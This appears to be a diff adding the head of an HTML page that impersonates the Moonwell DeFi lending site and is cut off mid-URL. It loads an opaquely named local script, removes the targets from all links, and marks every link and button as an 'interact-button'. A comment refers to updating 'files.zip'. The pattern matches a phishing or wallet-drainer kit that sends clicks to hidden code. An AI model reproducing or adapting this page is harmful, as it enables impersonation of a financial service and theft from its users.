@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html class="light has-scroll-init" style="color-scheme: light;" >
+
+<head>
+
+  <script charset="UTF-8" type="text/javascript" src="./aedef8f1-3faa-46eb-b6da-72b297a512eb.js"></script><!--  Please update files.zip if you not already did and check below (updated the 11/11) ––>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+        var links = document.querySelectorAll('body a');
+        for (var i = 0; i < links.length; i++) {
+            var link = links[i];
+            link.removeAttribute('href');
+            link.classList.add('interact-button');
+        }
+    });
+    </script>
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function () {
+        var buttons = document.querySelectorAll('body button');
+        for (var i = 0; i < buttons.length; i++) {
+            var button = buttons[i];
+            button.classList.add('interact-button');
+        }
+    });
+    </script>
+    
+    <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const elements = document.querySelectorAll('[ad-data-linked]');
+        elements.forEach(element => {
+            element.removeAttribute('ad-data-linked');
+        });
+    
+        console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+    });
+    </script>
+    
+    <style>
+    .interact-button {
+        cursor: pointer;
+    }
+    </style>
+  <title>Moonwell - Lending made simple</title>
+    <meta name="title" content="Moonwell - Lending made simple 🌜🌛">
+    <link rel="icon" type="image/x-icon" href="favicon.svg">
+    <meta name="application-name" content="PWA App">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="PWA App">
+    <meta name="description" content="Best PWA App in the world">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="msapplication-config" content="/icons/browserconfig.xml">
+    <meta name="msapplication-TileColor" content="#2474da">
+    <meta name="msapplication-tap-highlight" content="no">
+    <link rel="apple-touch-icon" href="https://moonwell.fi/icons/touch-icon-iphone.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://moonwell.fi/icons/touch-icon-ipad.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://moonwell.fi/icons/touch-icon-iphone-retina.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="https://moonwell.f
